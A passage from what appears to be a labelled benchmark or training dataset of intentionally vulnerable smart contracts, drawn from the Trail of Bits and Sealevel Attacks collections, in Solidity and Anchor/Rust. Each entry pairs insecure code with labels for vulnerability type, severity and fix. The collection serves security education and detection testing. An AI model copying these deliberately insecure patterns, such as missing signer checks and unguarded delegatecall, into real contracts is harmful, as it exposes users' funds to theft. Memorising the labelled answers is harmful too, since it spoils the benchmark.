delete m_pending[_operation];\n        return true;\n      }\n      else\n      {\n        // not enough: record that this owner in particular confirmed.\n        pending.yetNeeded--;\n        pending.ownersDone |= ownerIndexBit;\n      }\n    }\n  }\n\n  function reorganizeOwners() private {\n    uint free = 1;\n    while (free < m_numOwners)\n    {\n      while (free < m_numOwners && m_owners[free] != 0) free++;\n      while (m_numOwners > 1 && m_owners[m_numOwners] == 0) m_numOwners--;\n      if (free < m_numOwners && m_owners[m_numOwners] != 0 && m_owners[free] == 0)\n      {\n        m_owners[free] = m_owners[m_numOwners];\n        m_ownerIndex[m_owners[free]] = free;\n        m_owners[m_numOwners] = 0;\n      }\n    }\n  }\n\n  // checks to see if there is at least `_value` left from the daily limit today. if there is, subtracts it and\n  // returns true. otherwise just returns false.\n  function underLimit(uint _value) internal onlyowner returns (bool) {\n    // reset the spend limit if we're on a different day to last time.\n    if (today() > m_lastDay) {\n      m_spentToday = 0;\n      m_lastDay = today();\n    }\n    // check to see if there's enough left - if so, subtract and return true.\n    // overflow protection                    // dailyLimit check\n    if (m_spentToday + _value >= m_spentToday && m_spentToday + _value <= m_dailyLimit) {\n      m_spentToday += _value;\n      return true;\n    }\n    return false;\n  }\n\n  // determines today's index.\n  function today() private constant returns (uint) { return now / 1 days; }\n\n  function clearPending() internal {\n    uint length = m_pendingIndex.length;\n\n    for (uint i = 0; i < length; ++i) {\n      delete m_txs[m_pendingIndex[i]];\n\n      if (m_pendingIndex[i] != 0)\n        delete m_pending[m_pendingIndex[i]];\n    }\n\n    delete m_pendingIndex;\n  }\n\n  // FIELDS\n  address constant _walletLibrary = 0xcafecafecafecafecafecafecafecafecafecafe;\n\n  // the number of owners that must confirm the same operation before it is run.\n  uint public m_required;\n  // pointer used to find a free slot in m_owners\n  uint public m_numOwners;\n\n  uint public m_dailyLimit;\n  uint public m_spentToday;\n  uint public m_lastDay;\n\n  // list of owners\n  uint[256] m_owners;\n\n  uint constant c_maxOwners = 250;\n  // index on the list of owners to allow reverse lookup\n  mapping(uint => uint) m_ownerIndex;\n  // the ongoing operations.\n  mapping(bytes32 => PendingState) m_pending;\n  bytes32[] m_pendingIndex;\n\n  // pending transactions we have at present.\n  mapping (bytes32 => Transaction) m_txs;\n}\n\ncontract Wallet is WalletEvents {\n\n  // WALLET CONSTRUCTOR\n  //   calls the `initWallet` method of the Library in this context\n  function Wallet(address[] _owners, uint _required, uint _daylimit) {\n    // Signature of the Wallet Library's init function\n    bytes4 sig = bytes4(sha3(\"initWallet(address[],uint256,uint256)\"));\n    address target = _walletLibrary;\n\n    // Compute the size of the call data : arrays has 2\n    // 32bytes for offset and length, plus 32bytes per element ;\n    // plus 2 32bytes for each uint\n    uint argarraysize = (2 + _owners.length);\n    uint argsize = (2 + argarraysize) * 32;\n\n    assembly {\n      // Add the signature first to memory\n      mstore(0x0, sig)\n      // Add the call data, which is at the end of the\n      // code\n      codecopy(0x4,  sub(codesize, argsize), argsize)\n      // Delegate call to the library\n      delegatecall(sub(gas, 10000), target, 0x0, add(argsize, 0x4), 0x0, 0x0)\n    }\n  }\n\n  // METHODS\n\n  // gets called when no other function matches\n  function() payable {\n    // just being sent some cash?\n    if (msg.value > 0)\n      Deposit(msg.sender, msg.value);\n    else if (msg.data.length > 0)\n      _walletLibrary.delegatecall(msg.data);\n  }\n\n  // Gets an owner by 0-indexed position (using numOwners as the count)\n  function getOwner(uint ownerIndex) constant returns (address) {\n    return address(m_owners[ownerIndex + 1]);\n  }\n\n  // As return statement unavailable in fallback, explicit the method here\n\n  function hasConfirmed(bytes32 _operation, address _owner) external constant returns (bool) {\n    return _walletLibrary.delegatecall(msg.data);\n  }\n\n  function isOwner(address _addr) constant returns (bool) {\n    return _walletLibrary.delegatecall(msg.data);\n  }\n\n  // FIELDS\n  address constant _walletLibrary = 0xcafecafecafecafecafecafecafecafecafecafe;\n\n  // the number of owners that must confirm the same operation before it is run.\n  uint public m_required;\n  // pointer used to find a free slot in m_owners\n  uint public m_numOwners;\n\n  uint public m_dailyLimit;\n  uint public m_spentToday;\n  uint public m_lastDay;\n\n  // list of owners\n  uint[256] m_owners;\n}\n",
    "vulnerable_function": "revoke",
    "vulnerable_lines": [],
    "vulnerability_type": "access_control",
    "category": "unprotected_function",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "# Unprotected function\nMissing (or incorrectly used) modifier on a function allows an attacker to use sensitive functionality in the contract.",
    "fix_description": "",
    "references": [
      "https://etherscan.io/address/0xe82719202e5965Cf5D9B6673B7503a3b92DE20be#code",
      "https://blog.zeppelin.solutions/on-the-parity-wallet-multisig-hack-405a8c12e8f7",
      "https://github.com/BitGo/eth-multisig-v2/commit/8042188f08c879e06f097ae55c140e0aa7baaff8#diff-b498cc6fd64f83803c260abd8de0a8f5",
      "https://medium.com/nexus-mutual/responsible-vulnerability-disclosure-ece3fe3bcefa"
    ],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "unprotected_function/WalletLibrary_source_code/WalletLibrary.sol",
    "pragma": "^0.4.9",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_forced_ether_reception_coin",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "coin.sol",
    "file_content": "// taken from https://www.ethereum.org/token#the-coin (4/9/2018)\n\npragma solidity ^0.4.16;\n\ncontract owned {\n    address public owner;\n\n    function owned() public {\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner {\n        require(msg.sender == owner);\n        _;\n    }\n\n    function transferOwnership(address newOwner) onlyOwner public {\n        owner = newOwner;\n    }\n}\n\ninterface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) external; }\n\ncontract TokenERC20 {\n    // Public variables of the token\n    string public name;\n    string public symbol;\n    uint8 public decimals = 18;\n    // 18 decimals is the strongly suggested default, avoid changing it\n    uint256 public totalSupply;\n\n    // This creates an array with all balances\n    mapping (address => uint256) public balanceOf;\n    mapping (address => mapping (address => uint256)) public allowance;\n\n    // This generates a public event on the blockchain that will notify clients\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    \n    // This generates a public event on the blockchain that will notify clients\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n\n    /**\n     * Constrctor function\n     *\n     * Initializes contract with initial supply tokens to the creator of the contract\n     */\n    function TokenERC20(\n        string tokenName,\n        string tokenSymbol\n    ) public {\n        name = tokenName;                                   // Set the name for display purposes\n        symbol = tokenSymbol;                               // Set the symbol for display purposes\n    }\n\n    /**\n     * Internal transfer, only can be called by this contract\n     */\n    function _transfer(address _from, address _to, uint _value) internal {\n        // Prevent transfer to 0x0 address. \n        require(_to != 0x0);\n        // Check if the sender has enough\n        require(balanceOf[_from] >= _value);\n        // Check for overflows\n        require(balanceOf[_to] + _value > balanceOf[_to]);\n        // Save this for an assertion in the future\n        uint previousBalances = balanceOf[_from] + balanceOf[_to];\n        // Subtract from the sender\n        balanceOf[_from] -= _value;\n        // Add the same to the recipient\n        balanceOf[_to] += _value;\n        emit Transfer(_from, _to, _value);\n        // Asserts are used to use static analysis to find bugs in your code. They should never fail\n        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);\n    }\n\n    /**\n     * Transfer tokens\n     *\n     * Send `_value` tokens to `_to` from your account\n     *\n     * @param _to The address of the recipient\n     * @param _value the amount to send\n     */\n    function transfer(address _to, uint256 _value) public returns (bool success) {\n        _transfer(msg.sender, _to, _value);\n        return true;\n    }\n\n    /**\n     * Transfer tokens from other address\n     *\n     * Send `_value` tokens to `_to` in behalf of `_from`\n     *\n     * @param _from The address of the sender\n     * @param _to The address of the recipient\n     * @param _value the amount to send\n     */\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n        require(_value <= allowance[_from][msg.sender]);     // Check allowance\n        allowance[_from][msg.sender] -= _value;\n        _transfer(_from, _to, _value);\n        return true;\n    }\n\n    /**\n     * Set allowance for other address\n     *\n     * Allows `_spender` to spend no more than `_value` tokens in your behalf\n     *\n     * @param _spender The address authorized to spend\n     * @param _value the max amount they can spend\n     */\n    function approve(address _spender, uint256 _value) public\n        returns (bool success) {\n        allowance[msg.sender][_spender] = _value;\n        emit Approval(msg.sender, _spender, _value);\n        return true;\n    }\n\n    /**\n     * Set allowance for other address and notify\n     *\n     * Allows `_spender` to spend no more than `_value` tokens in your behalf, and then ping the contract about it\n     *\n     * @param _spender The address authorized to spend\n     * @param _value the max amount they can spend\n     * @param _extraData some extra information to send to the approved contract\n     */\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData)\n        public\n        returns (bool success) {\n        tokenRecipient spender = tokenRecipient(_spender);\n        if (approve(_spender, _value)) {\n            spender.receiveApproval(msg.sender, _value, this, _extraData);\n            return true;\n        }\n    }\n\n}\n\n/******************************************/\n/*       ADVANCED TOKEN STARTS HERE       */\n/******************************************/\n\ncontract MyAdvancedToken is owned, TokenERC20 {\n\n    mapping (address => bool) public frozenAccount;\n\n    /* This generates a public event on the blockchain that will notify clients */\n    event FrozenFunds(address target, bool frozen);\n\n    /* Initializes contract with initial supply tokens to the creator of the contract */\n    function MyAdvancedToken(\n        string tokenName,\n        string tokenSymbol\n    ) TokenERC20(tokenName, tokenSymbol) public {}\n\n    /* Internal transfer, only can be called by this contract */\n    function _transfer(address _from, address _to, uint _value) internal {\n        require (_to != 0x0);                               // Prevent transfer to 0x0 address.\n        require (balanceOf[_from] >= _value);               // Check if the sender has enough\n        require (balanceOf[_to] + _value >= balanceOf[_to]); // Check for overflows\n        require(!frozenAccount[_from]);                     // Check if sender is frozen\n        require(!frozenAccount[_to]);                       // Check if recipient is frozen\n        balanceOf[_from] -= _value;                         // Subtract from the sender\n        balanceOf[_to] += _value;                           // Add the same to the recipient\n        emit Transfer(_from, _to, _value);\n    }\n\n    /// @notice Buy tokens from contract by sending ether\n    function buy() payable public {\n        uint amount = msg.value;                          // calculates the amount\n\tbalanceOf[msg.sender] += amount;                  // updates the balance\n        totalSupply += amount;                            // updates the total supply\n        _transfer(address(0x0), msg.sender, amount);      // makes the transfer\n    }\n\n    /* Migration function */\n    function migrate_and_destroy() onlyOwner {\n\tassert(this.balance == totalSupply);                 // consistency check                                    \n\tsuicide(owner);                                      // transfer the ether to the owner and kill the contract\n    }\n}\n",
    "vulnerable_function": "owned",
    "vulnerable_lines": [],
    "vulnerability_type": "forced_ether",
    "category": "forced_ether_reception",
    "severity": "low",
    "difficulty_tier": 2,
    "description": "# Contracts can be forced to receive ether",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "forced_ether_reception/coin.sol",
    "pragma": "^0.4.16",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_incorrect_interface_alice",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Alice.sol",
    "file_content": "\npragma solidity ^0.4.15;\n\ncontract Alice { \n    int public val;\n\n    function set(int new_val){\n        val = new_val;\n    }\n\n    function set_fixed(int new_val){\n        val = new_val;\n    }\n\n    function(){\n        val = 1;\n    }\n}\n",
    "vulnerable_function": "set",
    "vulnerable_lines": [],
    "vulnerability_type": "interface_mismatch",
    "category": "incorrect_interface",
    "severity": "low",
    "difficulty_tier": 1,
    "description": "# Incorrect interface\nA contract interface defines functions with a different type signature than the implementation, causing two different method id's to be created.\nAs a result, when the interfact is called, the fallback method will be executed.",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_remediation": true,
    "context_level": "single_file",
    "original_source_path": "incorrect_interface/Alice.sol",
    "pragma": "^0.4.15",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_incorrect_interface_bob",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "Bob.sol",
    "file_content": "\npragma solidity ^0.4.15;\n\ncontract Alice { \n    function set(uint); \n    function set_fixed(int); \n}\n\ncontract Bob { \n    function set(Alice c){ \n        c.set(42); \n    }\n\n    function set_fixed(Alice c){ \n        c.set_fixed(42); \n    } \n}\n",
    "vulnerable_function": "set",
    "vulnerable_lines": [],
    "vulnerability_type": "interface_mismatch",
    "category": "incorrect_interface",
    "severity": "low",
    "difficulty_tier": 2,
    "description": "# Incorrect interface\nA contract interface defines functions with a different type signature than the implementation, causing two different method id's to be created.\nAs a result, when the interfact is called, the fallback method will be executed.",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_remediation": true,
    "context_level": "single_file",
    "original_source_path": "incorrect_interface/Bob.sol",
    "pragma": "^0.4.15",
    "source": "Trail of Bits"
  },
  {
    "id": "notso_race_condition_racecondition",
    "source_dataset": "not-so-smart-contracts",
    "language": "solidity",
    "chain": "evm",
    "file_name": "RaceCondition.sol",
    "file_content": "pragma solidity ^0.4.16;\n\n// https://github.com/ethereum/EIPs/issues/20\ncontract ERC20 {\n    function totalSupply() constant returns (uint totalSupply);\n    function balanceOf(address _owner) constant returns (uint balance);\n    function transfer(address _to, uint _value) returns (bool success);\n    function transferFrom(address _from, address _to, uint _value) returns (bool success);\n    function approve(address _spender, uint _value) returns (bool success);\n    function allowance(address _owner, address _spender) constant returns (uint remaining);\n    event Transfer(address indexed _from, address indexed _to, uint _value);\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\n}\n\ncontract RaceCondition{\n    address private owner;\n    uint public price;\n    ERC20 token;\n\n    function RaceCondition(uint _price, ERC20 _token)\n        public \n    {\n        owner = msg.sender;\n        price = _price;\n        token = _token;\n    }\n\n    // If the owner sees someone calls buy\n    // he can call changePrice to set a new price\n    // If his transaction is mined first, he can\n    // receive more tokens than excepted by the new buyer\n    function buy(uint new_price) payable\n        public\n    {\n        require(msg.value >= price);\n\n        // we assume that the RaceCondition contract\n        // has enough allowance\n        token.transferFrom(msg.sender, owner, price);\n\n        price = new_price;\n        owner = msg.sender;\n    }\n\n    function changePrice(uint new_price){\n        require(msg.sender == owner);\n        price = new_price; \n    }\n\n}\n",
    "vulnerable_function": "totalSupply",
    "vulnerable_lines": [],
    "vulnerability_type": "front_running",
    "category": "race_condition",
    "severity": "medium",
    "difficulty_tier": 3,
    "description": "# Race Condition\nThere is a gap between the creation of a transaction and the moment it is accepted in the blockchain.\nTherefore, an attacker can take advantage of this gap to put a contract in a state that advantages them.",
    "fix_description": "",
    "references": [],
    "is_vulnerable": true,
    "has_remediation": false,
    "context_level": "single_file",
    "original_source_path": "race_condition/RaceCondition.sol",
    "pragma": "^0.4.16",
    "source": "Trail of Bits"
  },
  {
    "id": "sealevel_0_signer_authorization",
    "source_dataset": "sealevel-attacks",
    "language": "rust",
    "chain": "solana",
    "framework": "anchor",
    "file_name": "0-signer-authorization_insecure.rs",
    "file_content": "use anchor_lang::prelude::*;\n\ndeclare_id!(\"Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS\");\n#[program]\npub mod signer_authorization_insecure {\n    use super::*;\n\n    pub fn log_message(ctx: Context<LogMessage>) -> ProgramResult {\n        msg!(\"GM {}\", ctx.accounts.authority.key().to_string());\n        Ok(())\n    }\n}\n\n#[derive(Accounts)]\npub struct LogMessage<'info> {\n    authority: AccountInfo<'info>,\n}\n",
    "vulnerable_function": "signer_authorization_insecure",
    "vulnerable_lines": [],
    "vulnerability_type": "missing_signer_check",
    "category": "0-signer-authorization",
    "severity": "critical",
    "difficulty_tier": 2,
    "description": "Missing signer check allows unauthorized users to call functions that should be restricted",
    "fix_description": "Add is_signer check: require!(ctx.accounts.authority.is_signer, ErrorCode::Unauthorized)",
    "references": [
      "https://github.com/coral-xyz/sealevel-attacks"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "has_poc": false,
    "context_level": "single_file",
    "original_source_path": "programs/0-signer-authorization/insecure/src/lib.rs",
    "source": "Coral XYZ / Sealevel Attacks"
  },
  {
    "id": "sealevel_1_account_data_matching",
    "source_dataset": "sealevel-attacks",
    "language": "rust",
    "chain": "solana",
    "framework": "anchor",
    "file_name": "1-account-data-matching_insecure.rs",
    "file_content": "use anchor_lang::prelude::*;\nuse anchor_lang::solana_program::program_pack::Pack;\nuse spl_token::state::Account as SplTokenAccount;\n\ndeclare_id!(\"Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS\");\n\n#[program]\npub mod account_data_matching_insecure {\n    use super::*;\n\n    pub fn log_message(ctx: Context<LogMessage>) -> ProgramResult {\n        let token = SplTokenAccount::unpack(&ctx.accounts.token.data.borrow())?;\n        msg!(\"Your account balance is: {}\", token.amount);\n        Ok(())\n    }\n}\n\n#[derive(Accounts)]\npub struct LogMessage<'info> {\n    token: AccountInfo<'info>,\n    authority: Signer<'info>,\n}\n",
    "vulnerable_function": "account_data_matching_insecure",
    "vulnerable_lines": [],
    "vulnerability_type": "account_validation",
    "category": "1-account-data-matching",
    "severity": "high",
    "difficulty_tier": 2,
    "description": "Lack of account data validation allows account substitution attacks",
    "fix_description": "Validate account data matches expected values before use",
    "references": [
      "https://github.com/coral-xyz/sealevel-attacks"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "has_poc": false,
    "context_level": "single_file",
    "original_source_path": "programs/1-account-data-matching/insecure/src/lib.rs",
    "source": "Coral XYZ / Sealevel Attacks"
  },
  {
    "id": "sealevel_10_sysvar_address_checking",
    "source_dataset": "sealevel-attacks",
    "language": "rust",
    "chain": "solana",
    "framework": "anchor",
    "file_name": "10-sysvar-address-checking_insecure.rs",
    "file_content": "use anchor_lang::prelude::*;\n\ndeclare_id!(\"Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS\");\n\n#[program]\npub mod insecure {\n    use super::*;\n\n    pub fn check_sysvar_address(ctx: Context<CheckSysvarAddress>) -> Result<()> {\n        msg!(\"Rent Key -> {}\", ctx.accounts.rent.key().to_string());\n        Ok(())\n    }\n}\n\n#[derive(Accounts)]\npub struct CheckSysvarAddress<'info> {\n    rent: AccountInfo<'info>,\n}\n",
    "vulnerable_function": "insecure",
    "vulnerable_lines": [],
    "vulnerability_type": "sysvar_validation",
    "category": "10-sysvar-address-checking",
    "severity": "medium",
    "difficulty_tier": 2,
    "description": "Missing sysvar address validation allows fake sysvar injection",
    "fix_description": "Validate sysvar address: require!(sysvar.key() == expected_sysvar_address)",
    "references": [
      "https://github.com/coral-xyz/sealevel-attacks"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "has_poc": false,
    "context_level": "single_file",
    "original_source_path": "programs/10-sysvar-address-checking/insecure/src/lib.rs",
    "source": "Coral XYZ / Sealevel Attacks"
  },
  {
    "id": "sealevel_2_owner_checks",
    "source_dataset": "sealevel-attacks",
    "language": "rust",
    "chain": "solana",
    "framework": "anchor",
    "file_name": "2-owner-checks_insecure.rs",
    "file_content": "use anchor_lang::prelude::*;\nuse anchor_lang::solana_program::program_error::ProgramError;\nuse anchor_lang::solana_program::program_pack::Pack;\nuse spl_token::state::Account as SplTokenAccount;\n\ndeclare_id!(\"Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS\");\n\n#[program]\npub mod owner_checks_insecure {\n    use super::*;\n\n    pub fn log_message(ctx: Context<LogMessage>) -> ProgramResult {\n        let token = SplTokenAccount::unpack(&ctx.accounts.token.data.borrow())?;\n        if ctx.accounts.authority.key != &token.owner {\n            return Err(ProgramError::InvalidAccountData);\n        }\n        msg!(\"Your account balance is: {}\", token.amount);\n        Ok(())\n    }\n}\n\n#[derive(Accounts)]\npub struct LogMessage<'info> {\n    token: AccountInfo<'info>,\n    authority: Signer<'info>,\n}\n",
    "vulnerable_function": "owner_checks_insecure",
    "vulnerable_lines": [],
    "vulnerability_type": "missing_owner_check",
    "category": "2-owner-checks",
    "severity": "critical",
    "difficulty_tier": 2,
    "description": "Missing owner validation allows use of accounts owned by wrong programs",
    "fix_description": "Check account owner: require!(account.owner == expected_program_id, ErrorCode::InvalidOwner)",
    "references": [
      "https://github.com/coral-xyz/sealevel-attacks"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "has_poc": false,
    "context_level": "single_file",
    "original_source_path": "programs/2-owner-checks/insecure/src/lib.rs",
    "source": "Coral XYZ / Sealevel Attacks"
  },
  {
    "id": "sealevel_3_type_cosplay",
    "source_dataset": "sealevel-attacks",
    "language": "rust",
    "chain": "solana",
    "framework": "anchor",
    "file_name": "3-type-cosplay_insecure.rs",
    "file_content": "use anchor_lang::prelude::*;\nuse borsh::{BorshDeserialize, BorshSerialize};\n\ndeclare_id!(\"Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS\");\n\n#[program]\npub mod type_cosplay_insecure {\n    use super::*;\n\n    pub fn update_user(ctx: Context<UpdateUser>) -> ProgramResult {\n        let user = User::try_from_slice(&ctx.accounts.user.data.borrow()).unwrap();\n        if ctx.accounts.user.owner != ctx.program_id {\n            return Err(ProgramError::IllegalOwner);\n        }\n        if user.authority != ctx.accounts.authority.key() {\n            return Err(ProgramError::InvalidAccountData);\n        }\n        msg!(\"GM {}\", user.authority);\n        Ok(())\n    }\n}\n\n#[derive(Accounts)]\npub struct UpdateUser<'info> {\n    user: AccountInfo<'info>,\n    authority: Signer<'info>,\n}\n\n#[derive(BorshSerialize, BorshDeserialize)]\npub struct User {\n    authority: Pubkey,\n}\n\n#[derive(BorshSerialize, BorshDeserialize)]\npub struct Metadata {\n    account: Pubkey,\n}\n",
    "vulnerable_function": "type_cosplay_insecure",
    "vulnerable_lines": [],
    "vulnerability_type": "type_cosplay",
    "category": "3-type-cosplay",
    "severity": "high",
    "difficulty_tier": 3,
    "description": "Account type confusion - accounts can impersonate other account types",
    "fix_description": "Use Anchor's Account<'info, T> type to enforce account type validation",
    "references": [
      "https://github.com/coral-xyz/sealevel-attacks"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "has_poc": false,
    "context_level": "single_file",
    "original_source_path": "programs/3-type-cosplay/insecure/src/lib.rs",
    "source": "Coral XYZ / Sealevel Attacks"
  },
  {
    "id": "sealevel_4_initialization",
    "source_dataset": "sealevel-attacks",
    "language": "rust",
    "chain": "solana",
    "framework": "anchor",
    "file_name": "4-initialization_insecure.rs",
    "file_content": "use anchor_lang::prelude::*;\nuse borsh::{BorshDeserialize, BorshSerialize};\nuse std::ops::DerefMut;\n\ndeclare_id!(\"Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS\");\n\n#[program]\npub mod initialization_insecure {\n    use super::*;\n\n    pub fn initialize(ctx: Context<Initialize>) -> ProgramResult {\n        let mut user = User::try_from_slice(&ctx.accounts.user.data.borrow()).unwrap();\n\n        user.authority = ctx.accounts.authority.key();\n\n        let mut storage = ctx.accounts.user.try_borrow_mut_data()?;\n        user.serialize(storage.deref_mut()).unwrap();\n        Ok(())\n    }\n}\n\n/*\n- reinitialize\n- create and dont initialize\n- passing previously initialzed accounts from other programs\n  (e.g. token program => need to check delegate and authority)\n*/\n\n#[derive(Accounts)]\npub struct Initialize<'info> {\n    user: AccountInfo<'info>,\n    authority: Signer<'info>,\n}\n\n#[derive(BorshSerialize, BorshDeserialize)]\npub struct User {\n    authority: Pubkey,\n}\n",
    "vulnerable_function": "initialization_insecure",
    "vulnerable_lines": [],
    "vulnerability_type": "missing_initialization_check",
    "category": "4-initialization",
    "severity": "critical",
    "difficulty_tier": 2,
    "description": "Missing initialization checks allow reinitialization attacks",
    "fix_description": "Add initialization flag and check: require!(!account.is_initialized, ErrorCode::AlreadyInitialized)",
    "references": [
      "https://github.com/coral-xyz/sealevel-attacks"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "has_poc": false,
    "context_level": "single_file",
    "original_source_path": "programs/4-initialization/insecure/src/lib.rs",
    "source": "Coral XYZ / Sealevel Attacks"
  },
  {
    "id": "sealevel_5_arbitrary_cpi",
    "source_dataset": "sealevel-attacks",
    "language": "rust",
    "chain": "solana",
    "framework": "anchor",
    "file_name": "5-arbitrary-cpi_insecure.rs",
    "file_content": "use anchor_lang::prelude::*;\nuse anchor_lang::solana_program;\n\ndeclare_id!(\"Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS\");\n\n#[program]\npub mod arbitrary_cpi_insecure {\n    use super::*;\n\n    pub fn cpi(ctx: Context<Cpi>, amount: u64) -> ProgramResult {\n        solana_program::program::invoke(\n            &spl_token::instruction::transfer(\n                ctx.accounts.token_program.key,\n                ctx.accounts.source.key,\n                ctx.accounts.destination.key,\n                ctx.accounts.authority.key,\n                &[],\n                amount,\n            )?,\n            &[\n                ctx.accounts.source.clone(),\n                ctx.accounts.destination.clone(),\n                ctx.accounts.authority.clone(),\n            ],\n        )\n    }\n}\n\n#[derive(Accounts)]\npub struct Cpi<'info> {\n    source: AccountInfo<'info>,\n    destination: AccountInfo<'info>,\n    authority: AccountInfo<'info>,\n    token_program: AccountInfo<'info>,\n}\n",
    "vulnerable_function": "arbitrary_cpi_insecure",
    "vulnerable_lines": [],
    "vulnerability_type": "cpi_injection",
    "category": "5-arbitrary-cpi",
    "severity": "critical",
    "difficulty_tier": 3,
    "description": "Unconstrained Cross-Program Invocation (CPI) allows arbitrary program calls",
    "fix_description": "Constrain target program in CPI: require!(ctx.accounts.target_program.key() == expected_program_id)",
    "references": [
      "https://github.com/coral-xyz/sealevel-attacks"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "has_poc": false,
    "context_level": "single_file",
    "original_source_path": "programs/5-arbitrary-cpi/insecure/src/lib.rs",
    "source": "Coral XYZ / Sealevel Attacks"
  },
  {
    "id": "sealevel_6_duplicate_mutable_accounts",
    "source_dataset": "sealevel-attacks",
    "language": "rust",
    "chain": "solana",
    "framework": "anchor",
    "file_name": "6-duplicate-mutable-accounts_insecure.rs",
    "file_content": "use anchor_lang::prelude::*;\n\ndeclare_id!(\"Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS\");\n\n#[program]\npub mod duplicate_mutable_accounts_insecure {\n    use super::*;\n\n    pub fn update(ctx: Context<Update>, a: u64, b: u64) -> ProgramResult {\n        let user_a = &mut ctx.accounts.user_a;\n        let user_b = &mut ctx.accounts.user_b;\n\n        user_a.data = a;\n        user_b.data = b;\n        Ok(())\n    }\n}\n\n#[derive(Accounts)]\npub struct Update<'info> {\n    user_a: Account<'info, User>,\n    user_b: Account<'info, User>,\n}\n\n#[account]\npub struct User {\n    data: u64,\n}\n",
    "vulnerable_function": "duplicate_mutable_accounts_insecure",
    "vulnerable_lines": [],
    "vulnerability_type": "duplicate_mutable_accounts",
    "category": "6-duplicate-mutable-accounts",
    "severity": "high",
    "difficulty_tier": 4,
    "description": "Passing the same account twice as mutable can cause unexpected behavior",
    "fix_description": "Add constraint to ensure accounts are different: #[account(constraint = account1.key() != account2.key())]",
    "references": [
      "https://github.com/coral-xyz/sealevel-attacks"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "has_poc": false,
    "context_level": "single_file",
    "original_source_path": "programs/6-duplicate-mutable-accounts/insecure/src/lib.rs",
    "source": "Coral XYZ / Sealevel Attacks"
  },
  {
    "id": "sealevel_7_bump_seed_canonicalization",
    "source_dataset": "sealevel-attacks",
    "language": "rust",
    "chain": "solana",
    "framework": "anchor",
    "file_name": "7-bump-seed-canonicalization_insecure.rs",
    "file_content": "use anchor_lang::prelude::*;\n\ndeclare_id!(\"Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS\");\n\n#[program]\npub mod bump_seed_canonicalization_insecure {\n    use super::*;\n\n    pub fn set_value(ctx: Context<BumpSeed>, key: u64, new_value: u64, bump: u8) -> ProgramResult {\n        let address =\n            Pubkey::create_program_address(&[key.to_le_bytes().as_ref(), &[bump]], ctx.program_id)?;\n        if address != ctx.accounts.data.key() {\n            return Err(ProgramError::InvalidArgument);\n        }\n\n        ctx.accounts.data.value = new_value;\n\n        Ok(())\n    }\n}\n\n#[derive(Accounts)]\npub struct BumpSeed<'info> {\n    data: Account<'info, Data>,\n}\n\n#[account]\npub struct Data {\n    value: u64,\n}\n",
    "vulnerable_function": "bump_seed_canonicalization_insecure",
    "vulnerable_lines": [],
    "vulnerability_type": "pda_manipulation",
    "category": "7-bump-seed-canonicalization",
    "severity": "high",
    "difficulty_tier": 3,
    "description": "Non-canonical bump seeds in PDA derivation can be exploited",
    "fix_description": "Use canonical bump: let (pda, bump) = Pubkey::find_program_address(&[seed], program_id); require!(bump == provided_bump)",
    "references": [
      "https://github.com/coral-xyz/sealevel-attacks"
    ],
    "is_vulnerable": true,
    "has_remediation": true,
    "has_poc": false,
    "context_level": "single_file",
    "original_source_path": "programs/7-bump-seed-canonicalization/insecure/src/lib.rs",
    "source": "Coral XYZ / Sealevel Attacks"
  },
  {
    "id": "sealevel_8_pda_sharing",
    "source_dataset": "sealevel-attacks",
    "language": "rust",
    "chain": "solana",
    "framework": "anchor",
    "file_name": "8-pda-sharing_insecure.rs",
